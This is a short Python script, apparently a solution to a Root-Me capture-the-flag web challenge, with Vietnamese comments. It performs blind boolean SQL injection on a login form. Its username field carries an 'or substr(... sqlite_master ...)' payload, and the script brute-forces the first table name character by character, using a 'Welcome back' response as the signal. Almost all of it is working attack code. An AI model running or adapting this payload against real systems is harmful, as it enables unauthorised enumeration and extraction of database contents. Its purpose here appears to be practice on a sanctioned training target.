######################  TÌM CHÍNH XÁC TÊN TABLE #######################

import requests
import itertools as iter # Chạy 2 range (vùng giá trị) trên 1 vòng lặp for

query = "1' or substr((select tbl_name from sqlite_master limit 0, 1), "   
stringResult = ""

for j in range(1, 6):
    for i in iter.chain(range(48, 58), range(65, 91), range(97, 123)):
        username = query + str(j) +  ", 1) = '" + chr(i) + "' -- " 
        payload = {
            'username' : username,
            'password' : 123 
        }
        request = requests.post('http://challenge01.root-me.org/web-serveur/ch10/', payload)
        if ('Welcome back' in request.text):
            if (j != 5):
                stringResult += chr(i) 
                print(chr(i) + " is valid. Current string: " + stringResult)
                break    
            else:
                stringResult += chr(i) 
                print(chr(i) + " is valid. Complete table's name: " + stringResult)
                break 
        else:
            print(chr(i) + " is not valid ! Continue ... ")
